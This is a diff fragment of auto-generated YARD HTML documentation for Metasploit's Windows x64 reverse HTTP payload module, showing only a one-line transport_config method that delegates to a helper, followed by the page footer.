+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/x64/reverse_win_http_x64.rb', line 58</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_transport_config'>transport_config</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='op'>=</span><span class='lbrace'>{</span><span class='rbrace'>}</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_transport_config_reverse_http'>transport_config_reverse_http</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='rparen'>)</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+  </div>
+
+</div>
+
+      <div id="footer">
+  Generated on Wed Mar 31 00:31:57 2021 by
+  <a href="http://yardoc.org" title="Yay! A Ruby Documentation Tool" target="_parent">yard</a>
+  0.9.26 (ruby-2.7.2).
+</div>
+
+    </div>
+  </body>
+</html>
